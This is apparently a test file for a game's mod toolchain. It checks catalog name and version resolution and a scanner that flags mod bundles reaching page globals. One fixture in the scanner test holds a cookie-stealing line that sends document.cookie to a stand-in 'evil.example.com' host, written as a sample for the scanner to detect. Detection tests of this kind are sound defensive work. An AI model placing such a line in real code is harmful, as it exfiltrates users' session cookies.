// The game repo's side of the mod toolchain: the scanner that keeps a published bundle from
// reaching page globals, and the catalog a server CLI resolves mod names against. The registry's own
// tooling is tested in the spup-mods repo.

import {test} from "node:test";
import assert from "node:assert/strict";
import {freeIdentifiers} from "../../tools/mod-scan.js";
import {ModCatalog} from "@/server/ModCatalog.js";

test("a catalog resolves names and pinned versions", () => {
    const catalog = ModCatalog.parse({mods: [{
        name: "market",
        description: "Trading terminals.",
        versions: [
            {version: "1.0.0", url: "https://mods.example.com/p/market/1.0.0/"},
            {version: "1.1.0", url: "https://mods.example.com/p/market/1.1.0/"},
        ],
    }]});

    assert.equal(catalog.resolve("market").version.version, "1.1.0", "a bare name takes the newest");
    assert.equal(catalog.resolve("market@1.0.0").version.version, "1.0.0");
    assert.throws(() => catalog.resolve("nope"), /lists no mod/);
    assert.throws(() => catalog.resolve("market@9.9.9"), /no published version/);
});

test("the free-variable scan catches a bundle reaching page globals", () => {
    const clean = `
        export function createDeclaration(sdk) {
            const {ObjectType} = sdk;
            const names = [1, 2].map(value => String(value));
            for (const name of names) {
                JSON.stringify({name});
            }
            try {
                Math.round(1.5);
            } catch (problem) {
                console.error(problem);
            }
            class Local extends ObjectType {}
            return new Local();
        }
    `;
    assert.deepEqual([...freeIdentifiers(clean).keys()], []);

    const hostile = `
        export function createClient(sdk) {
            fetch("https://evil.example.com", {body: document.cookie});
            return new sdk.AbstractClientMod();
        }
    `;
    assert.deepEqual([...freeIdentifiers(hostile).keys()].sort(), ["document", "fetch"]);
});
